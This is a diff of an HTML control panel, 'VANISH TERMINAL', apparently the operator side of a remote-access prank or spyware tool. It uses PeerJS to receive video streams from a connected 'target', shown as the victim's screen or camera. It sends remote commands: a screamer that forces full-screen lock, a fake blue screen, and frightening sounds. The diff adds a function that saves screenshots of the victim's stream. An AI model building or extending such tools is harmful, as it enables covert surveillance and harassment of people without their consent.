@@ -1,38 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TERMINAL v8.0 - VANISH</title>
+    <title>VANISH TERMINAL v9.0</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        #sidebar { width: 320px; border-right: 1px solid #222; padding: 20px; background: #0a0a0a; display: flex; flex-direction: column; }
+        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; margin: 0; height: 100vh; }
+        #side { width: 320px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; box-shadow: 2px 0 15px rgba(0,255,0,0.1); }
         #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; background: #000; overflow-y: auto; }
-        video { width: 100%; border: 2px solid #333; border-radius: 8px; background: #111; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
-        .btn { padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 12px; border-radius: 6px; border: 1px solid #0f0; background: transparent; color: #0f0; text-transform: uppercase; transition: 0.2s; }
-        .btn:hover { background: #0f0; color: #000; box-shadow: 0 0 20px #0f0; }
-        .btn-red { border-color: #ff0050; color: #ff0050; }
-        .btn-red:hover { background: #ff0050; color: #fff; box-shadow: 0 0 20px #ff0050; }
-        .status { padding: 10px; border: 1px solid #333; margin-bottom: 20px; font-size: 12px; color: #666; }
+        video { width: 100%; border: 2px solid #333; border-radius: 10px; background: #111; transition: 0.3s; }
+        video:hover { border-color: #0f0; }
+        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; text-transform: uppercase; font-weight: bold; font-size: 12px; }
+        .btn:hover { background: #0f0; color: #000; }
+        .btn-red { color: #ff0050; border-color: #ff0050; }
+        .btn-red:hover { background: #ff0050; color: #fff; }
+        .status-box { border: 1px solid #333; padding: 10px; margin-bottom: 20px; font-size: 11px; }
     </style>
 </head>
 <body>
     <audio id="notif" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>
 
-    <div id="sidebar">
+    <div id="side">
         <h2 style="color: #ff0050;">VANISH CORE</h2>
-        <div id="st" class="status">ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ...</div>
+        <div id="status" class="status-box">SCANNING FOR TARGETS...</div>
         
-        <button class="btn btn-red" onclick="send('SCR')">💀 ЗАПУСТИТЬ СКРИМЕР 💀</button>
-        <button class="btn" onclick="send('BSOD')">💻 СИНИЙ ЭКРАН (BSOD)</button>
-        <hr color="#222" style="width: 100%;">
-        <p>УДАЛЕННЫЕ ЗВУКИ:</p>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/fart-with-reverb.mp3')">💨 ПУК</button>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК В ДВЕРЬ</button>
+        <button class="btn btn-red" onclick="send('SCR')">💀 SCREAMER (F11 + LOCK)</button>
+        <button class="btn" onclick="takeSnapshot()">📸 СДЕЛАТЬ СКРИНШОТ</button>
+        <button class="btn" onclick="send('BSOD')">💻 ВЫЗВАТЬ BSOD</button>
+        
+        <p style="font-size: 10px; color: #444;">УПРАВЛЕНИЕ ЗВУКОМ:</p>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
     </div>
 
     <div id="monitor"></div>
+
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
 
     <script>
         const MY_ID = '09062012';
@@ -42,24 +45,45 @@
         peer.on('connection', conn => {
             activeConn = conn;
             document.getElementById('notif').play().catch(()=>{});
-            document.getElementById('st').innerText = "ЦЕЛЬ ПОДКЛЮЧЕНА (ONLINE)";
-            document.getElementById('st').style.borderColor = "#0f0";
-            document.getElementById('st').style.color = "#0f0";
+            document.getElementById('status').innerText = "TARGET CONNECTED\nIP: LOGGED\nSTATUS: ACTIVE";
+            document.getElementById('status').style.color = "#0f0";
         });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                const v = document.createElement('video');
-                v.autoplay = true; v.playsinline = true; v.srcObject = stream;
-                document.getElementById('monitor').appendChild(v);
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.playsinline = true;
+                video.srcObject = stream;
+                video.id = "stream-" + Date.now();
+                document.getElementById('monitor').appendChild(video);
             });
         });
 
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
         function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
 
-        window.onclick = () => { console.log("Interface Active"); };
+        // Функция для создания скриншота из видеопотока
+        function takeSnapshot() {
+            const videos = document.getElementsByTagName('video');
+            if(videos.length === 0) return alert("Нет активных потоков!");
+            
+            const canvas = document.getElementById('hidden-canvas');
+            const video = videos[videos.length - 1]; // Берем последний поток (обычно это экран)
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const link = document.createElement('a');
+            link.download = 'snapshot_' + Date.now() + '.png';
+            link.href = canvas.toDataURL();
+            link.click();
+        }
+
+        window.onclick = () => { console.log("System Initialized"); };
     </script>
 </body>
 </html>
